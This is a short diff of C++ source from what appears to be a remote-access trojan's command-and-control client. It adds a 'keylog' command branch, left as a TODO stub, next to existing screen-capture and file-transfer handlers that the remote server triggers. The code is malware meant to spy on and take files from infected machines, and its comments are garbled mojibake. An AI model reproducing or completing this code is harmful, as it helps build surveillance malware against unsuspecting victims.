@@ -223,6 +223,10 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
                         std::thread screenHandler = std::thread(&cncManager::handleScreenRequest, this);
                         screenHandler.detach();
                     }
+                    /* 虐肺弊 贸府 */
+                    else if (!data.compare("keylog")) {
+                        // TODO send keylog
+                    }
                     /* 颇老 夸没 贸府 */
                     else {
                         std::thread ftpHandler = std::thread(&cncManager::handleFtpRequest, this,data);
